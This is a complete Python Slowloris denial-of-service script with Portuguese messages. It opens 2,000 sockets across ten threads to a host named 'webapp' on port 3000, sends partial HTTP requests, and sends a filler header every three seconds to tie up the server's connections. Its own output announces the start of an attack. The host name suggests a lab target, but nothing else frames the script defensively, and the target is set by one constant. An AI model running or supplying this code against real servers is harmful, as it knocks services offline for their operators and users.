import socket
import time
import threading

HOST = "webapp"
PORT = 3000
SOCKETS_PER_THREAD = 200
TOTAL_SOCKETS = 2000
HEADER_INTERVAL = 3

sockets = []
lock = threading.Lock()

def criar_sockets(qtd):
    for i in range(qtd):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((HOST, PORT))
            s.sendall(f"GET / HTTP/1.1\r\nHost: {HOST}\r\n".encode())
            s.sendall(b"User-Agent: slowloris\r\n")
            with lock:
                sockets.append(s)
        except Exception as e:
            print(f"[-] Falha ao criar socket {i}: {e}")

def manter_conexoes():
    while True:
        print(f"[i] Enviando headers para {len(sockets)} conexões vivas...")
        for s in sockets.copy():
            try:
                s.send(b"X-a: b\r\n")
            except Exception:
                with lock:
                    sockets.remove(s)
        time.sleep(HEADER_INTERVAL)

if __name__ == "__main__":
    threads = []
    qtd_threads = TOTAL_SOCKETS // SOCKETS_PER_THREAD

    print(f"[*] Iniciando ataque com {TOTAL_SOCKETS} conexões usando {qtd_threads} threads.")

    for _ in range(qtd_threads):
        t = threading.Thread(target=criar_sockets, args=(SOCKETS_PER_THREAD,))
        t.start()
        threads.append(t)
        time.sleep(0.5)  # pequeno delay entre as waves de conexão

    for t in threads:
        t.join()

    print(f"[+] Criadas {len(sockets)} conexões.")

    manter_conexoes()
